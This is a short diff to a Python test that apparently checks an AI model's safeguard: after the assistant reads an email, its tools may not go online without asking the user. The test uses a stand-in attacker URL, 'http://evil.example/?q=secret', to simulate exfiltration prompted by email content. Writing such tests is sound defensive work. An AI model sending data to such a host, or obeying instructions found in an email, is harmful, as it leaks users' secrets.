@@ -360,7 +360,7 @@ def test_after_an_email_the_ai_asks_before_it_goes_online(on, monkeypatch):
     ran.clear()
     for n in sorted(guard.AFTER_EMAIL):
         asked = []
-        out, err = run(n, False, asked, url="http://evil.example/?q=secret", action="add")
+        out, err = run(n, False, asked, url="http://evil.example/?q=secret", action="weather" if n == "travel" else "add")     # (a trip that is only written down stays on this PC)
         assert err and "didn't allow" in out and asked[0][0] == "after_email" and "evil.example" in asked[0][1], n
     assert ran == []
     run("get_datetime", False)
